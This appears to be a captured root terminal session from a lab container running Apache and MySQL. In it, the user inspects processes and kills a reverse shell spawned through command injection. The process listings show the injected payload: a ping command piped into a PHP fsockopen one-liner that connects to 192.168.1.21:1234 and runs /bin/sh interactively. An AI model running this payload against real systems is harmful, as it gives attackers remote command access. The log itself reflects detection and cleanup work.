@@ -1,0 +1,131 @@
+ * Starting Apache httpd web server apache2       [188G AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
+ * 
+ * Starting MySQL database server mysqld       [188G su: warning: cannot change directory to /nonexistent: No such file or directory
+[182G[ OK ]
+Apache2 and MySQL Service has been started
+]0;root@224bff7a1741: /root@224bff7a1741:/# sudo service mysql stop
+ * Stopping MySQL database server mysqld       [188G 
+[182G[ OK ]
+]0;root@224bff7a1741: /root@224bff7a1741:/# sudo usermod -d /var/lib/mysql/ mysql
+]0;root@224bff7a1741: /root@224bff7a1741:/# [Ksudo service mysql start
+ * Starting MySQL database server mysqld       [188G [182G[ OK ]
+]0;root@224bff7a1741: /root@224bff7a1741:/# l ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.0   4248  1860 pts/0    Ss   12:59   0:00 /bin/bash
+root          34  0.0  0.3 194048 15260 ?        Ss   12:59   0:00 /usr/sbin/apache2 -k start
+www-data      39  0.0  0.2 194280  9416 ?        S    12:59   0:00 /usr/sbin/apache2 -k start
+www-data      40  0.0  0.2 194296 10556 ?        S    12:59   0:00 /usr/sbin/apache2 -k start
+www-data      41  0.0  0.2 194296  8808 ?        S    12:59   0:00 /usr/sbin/apache2 -k start
+www-data      42  0.0  0.2 194272  8588 ?        S    12:59   0:00 /usr/sbin/apache2 -k start
+www-data      43  0.0  0.2 194272  8668 ?        S    12:59   0:00 /usr/sbin/apache2 -k start
+mysql        410  0.0  0.0   2616   212 ?        S    13:01   0:00 /bin/sh /usr/bin/mysqld_safe
+mysql        557  0.5  8.8 1740860 358020 ?      Sl   13:01   0:06 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/er
+www-data     620  0.0  0.0 194088  3668 ?        S    13:05   0:00 /usr/sbin/apache2 -k start
+www-data     639  0.0  0.0   2616    68 ?        S    13:09   0:00 sh -c ping -c2 google.com|php -r '$so=fsockopen("192.168.1.21",1234);exec("/bin/sh -i <&3 >&3 2>&3");' 2>&1
+www-data     641  0.0  0.4  59400 16284 ?        S    13:09   0:00 php -r $so=fsockopen("192.168.1.21",1234);exec("/bin/sh -i <&3 >&3 2>&3");
+www-data     642  0.0  0.0   2616    68 ?        S    13:09   0:00 sh -c /bin/sh -i <&3 >&3 2>&3
+www-data     643  0.0  0.0   2616    68 ?        S    13:09   0:00 /bin/sh -i
+root        1477  0.0  0.0   5904  2904 pts/0    R+   13:24   0:00 ps aux
+]0;root@224bff7a1741: /root@224bff7a1741:/# kill-  -i 643         all 643 
+643: no process found
+]0;root@224bff7a1741: /root@224bff7a1741:/# killall 643 [1P 2 
+642: no process found
+]0;root@224bff7a1741: /root@224bff7a1741:/# killall 642 [1P[1P[1P [1@ [1@-[1@9 642[1P 3 
+]0;root@224bff7a1741: /root@224bff7a1741:/# kill -9 643 all 642 3 [6Pps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.0   4248  2212 pts/0    Ss   12:59   0:00 /bin/bash
+root          34  0.0  0.3 194048 15260 ?        Ss   12:59   0:00 /usr/sbin/apache2 -k start
+www-data      39  0.0  0.2 194280  9416 ?        S    12:59   0:00 /usr/sbin/apache2 -k start
+www-data      40  0.0  0.2 194296 10556 ?        S    12:59   0:00 /usr/sbin/apache2 -k start
+www-data      41  0.0  0.2 194296  8808 ?        S    12:59   0:00 /usr/sbin/apache2 -k start
+www-data      42  0.0  0.2 194272  8588 ?        S    12:59   0:00 /usr/sbin/apache2 -k start
+www-data      43  0.0  0.2 194272  9440 ?        S    12:59   0:00 /usr/sbin/apache2 -k start
+mysql        410  0.0  0.0   2616   212 ?        S    13:01   0:00 /bin/sh /usr/bin/mysqld_safe
+mysql        557  0.5  8.8 1740860 358020 ?      Sl   13:01   0:07 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/er
+www-data     620  0.0  0.0 194088  3668 ?        S    13:05   0:00 /usr/sbin/apache2 -k start
+root        1641  0.0  0.0   5904  2928 pts/0    R+   13:25   0:00 ps aux
+]0;root@224bff7a1741: /root@224bff7a1741:/# ps -eaf --forest
+UID          PID    PPID  C STIME TTY          TIME CMD
+root           1       0  0 12:59 pts/0    00:00:00 /bin/bash
+root          34       1  0 12:59 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data      39      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data      40      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data      41      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data      42      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data      43      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data     620      34  0 13:05 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+mysql        410       1  0 13:01 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
+mysql        557     410  0 13:01 ?        00:00:07  \_ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log --p
+root        1680       1  0 13:25 pts/0    00:00:00 ps -eaf --forest
+]0;root@224bff7a1741: /root@224bff7a1741:/# ps tree 
+error: TTY could not be found
+
+Usage:
+ ps [options]
+
+ Try 'ps --help <simple|list|output|threads|misc|all>'
+  or 'ps --help <s|l|o|t|m|a>'
+ for additional help text.
+
+For more details see ps(1).
+]0;root@224bff7a1741: /root@224bff7a1741:/# ps tree  [1P[1P[1P
+bash: tree: command not found
+]0;root@224bff7a1741: /root@224bff7a1741:/# tree [3@ps tree -eaf --forestaux[Kkill -9 643 all 642 3 [6Pps aux[K]0;root@224bff7a1741: /root@224bff7a1741:/# ps aux[K]0;root@224bff7a1741: /root@224bff7a1741:/# ps auxsudo service mysql startusermod -d /var/lib/mysql/ mysql[13Pservice mysql startps aux[Kkillall 643 2  -9 643 [6Pps aux-eaf --forest[8Ptree -eaf --forest
+UID          PID    PPID  C STIME TTY          TIME CMD
+root           1       0  0 12:59 pts/0    00:00:00 /bin/bash
+root          34       1  0 12:59 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data      39      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data      40      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data      41      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data    1809      41  0 13:27 ?        00:00:00  |   \_ sh -c ping -c2 google.com|php -r
+www-data    1811    1809  1 13:27 ?        00:00:00  |       \_ php -r $sock=fsockopen("192.
+www-data    1812    1811  0 13:27 ?        00:00:00  |           \_ sh -c /bin/sh -i <&3 >&3
+www-data    1813    1812  0 13:27 ?        00:00:00  |               \_ /bin/sh -i
+www-data      42      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data      43      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data     620      34  0 13:05 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+mysql        410       1  0 13:01 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
+mysql        557     410  0 13:01 ?        00:00:07  \_ /usr/sbin/mysqld --basedir=/usr --da
+root        1822       1  0 13:27 pts/0    00:00:00 ps -eaf --forest
+]0;root@224bff7a1741: /root@224bff7a1741:/# kill -9 1809 
+]0;root@224bff7a1741: /root@224bff7a1741:/# kill -9 1809 ps -eaf --forest
+UID          PID    PPID  C STIME TTY          TIME CMD
+root           1       0  0 12:59 pts/0    00:00:00 /bin/bash
+root          34       1  0 12:59 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data      39      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data      40      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data      41      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data    1809      41  0 13:27 ?        00:00:00  |   \_ [sh] <defunct>
+www-data      42      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data      43      34  0 12:59 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+www-data     620      34  0 13:05 ?        00:00:00  \_ /usr/sbin/apache2 -k start
+mysql        410       1  0 13:01 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
+mysql        557     410  0 13:01 ?        00:00:08  \_ /usr/sbin/mysqld --basedir=/usr --da
+www-data    1811       1  0 13:27 ?        00:00:00 php -r $sock=fsockopen("192.168.1.21",12
+www-data    1812    1811  0 13:27 ?        00:00:00  \_ sh -c /bin/sh -i <&3 >&3 2>&3
+www-data    1813    1812  0 13:27 ?        00:00:00      \_ /bin/sh -i
+root        1897       1  0 13:28 pts/0    00:00:00 ps -eaf --forest
+]0;root@224bff7a1741: /root@224bff7a1741:/# ps -eaf --forest[3Pkill -9 1809 ps -eaf --forest[Kps -eaf --forest[3Pkill -9 1809      1812 
+]0;root@224bff7a1741: /root@224bff7a1741:/# netsat        cd /proc
+]0;root@224bff7a1741: /procroot@224bff7a1741:/proc# ls
+1     557        devices        ioports      locks         schedstat      tty
+1813  620        diskstats      irq          meminfo       self           uptime
+1915  acpi       dma            kallsyms     misc          slabinfo       version
+2163  asound     driver         kcore        modules       softirqs       vmallocinfo
+34    buddyinfo  dynamic_debug  key-users    mounts        stat           vmstat
+39    bus        execdomains    keys         mtrr          swaps          zoneinfo
+40    cgroups    fb             kmsg         net           sys
+41    cmdline    filesystems    kpagecgroup  pagetypeinfo  sysrq-trigger
+410   consoles   fs             kpagecount   partitions    sysvipc
+42    cpuinfo    interrupts     kpageflags   pressure      thread-self
+43    crypto     iomem          loadavg      sched_debug   timer_list
+]0;root@224bff7a1741: /procroot@224bff7a1741:/proc# cd  [K]0;root@224bff7a1741: /procroot@224bff7a1741:/proc# cd[K]0;root@224bff7a1741: /procroot@224bff7a1741:/proc# cd[K]0;root@224bff7a1741: /procroot@224bff7a1741:/proc# cd[K]0;root@224bff7a1741: /procroot@224bff7a1741:/proc# cd[K]0;root@224bff7a1741: /procroot@224bff7a1741:/proc# cdexit
+ * Starting Apache httpd web server apache2       [80G AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
+ * 
+mysqld: [Warning] World-writable config file '/etc/mysql/my.cnf' is ignored.
+ * Starting MySQL database server mysqld       [80G mysqld: [Warning] World-writable config file '/etc/mysql/my.cnf' is ignored.
+mysqld: [Warning] World-writable config file '/etc/mysql/my.cnf' is ignored.
+mysqld: [Warning] World-writable config file '/etc/mysql/my.cnf' is ignored.
+mysqld: [Warning] World-writable config file '/etc/mysql/my.cnf' is ignored.
+[74G[ OK ]
+Apache2 and MySQL Service has been started
